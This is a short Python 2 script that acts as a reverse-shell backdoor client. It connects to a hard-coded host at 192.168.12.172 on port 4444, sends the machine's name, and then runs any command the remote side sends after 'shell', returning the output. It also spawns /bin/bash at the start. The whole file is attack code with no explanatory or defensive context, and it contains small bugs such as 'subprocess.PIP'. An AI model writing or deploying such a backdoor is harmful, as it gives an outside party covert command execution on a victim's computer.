import socket, os, subprocess
def connect():
    os.system('/bin/bash')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 4444
    host = '192.168.12.172'
    try:
        print '[!] Trying to connect to %s:%s'%(host,port)
        s.connect((host, port))
        s.send(os.environ['COMPUTERNAME'])
    except:
        print 'Failed'
def send(args):
    send = s.send(args)
    receive()

def receive():
    receive = s.recv(1024)
    if receive == 'quit':
        s.close()
    elif receive[0:5] == 'shell':
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIP, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value
    else:
        args = "no valid input was given"
    send(args)

connect()
receive()
s.close()




